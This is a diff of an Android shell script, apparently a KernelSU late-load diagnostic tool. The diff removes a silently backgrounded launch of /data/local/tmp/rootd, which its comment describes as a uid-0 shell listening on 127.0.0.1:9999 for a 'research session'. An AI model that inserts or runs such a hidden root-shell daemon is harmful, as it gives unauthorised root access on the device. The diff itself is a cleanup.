@@ -6,8 +6,6 @@ LOG2="$DB/files/dfsh.log"
 API=$(uname -r | sed -n 's/.*android\([0-9]*\)-.*/\1/p')
 KV=$(uname -r | cut -d. -f1-2)
 KMI="android${API}-${KV}"
-# debug channel: uid-0 shell on 127.0.0.1:9999 (temporary, research session)
-setsid /data/local/tmp/rootd >/dev/null 2>&1 &
 {
   echo "=== dfsh v3: KernelSU late-load diag ==="
   echo "time: $(date) | uid: $(id -u) | uname: $(uname -r)"
